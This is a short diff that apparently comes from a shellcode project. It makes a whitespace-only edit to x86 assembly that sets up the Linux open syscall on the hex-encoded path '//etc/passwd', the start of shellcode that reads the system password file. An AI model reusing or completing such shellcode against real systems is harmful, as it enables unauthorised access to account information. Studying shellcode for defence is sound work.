@@ -7,7 +7,7 @@
 XOR      ECX, ECX
 MUL      ECX
 MOV      AL, 0x5
-PUSH      ECX
+PUSH     ECX
 PUSH     0x64777373
 PUSH     0x61702f63
 PUSH     0x74652f2f
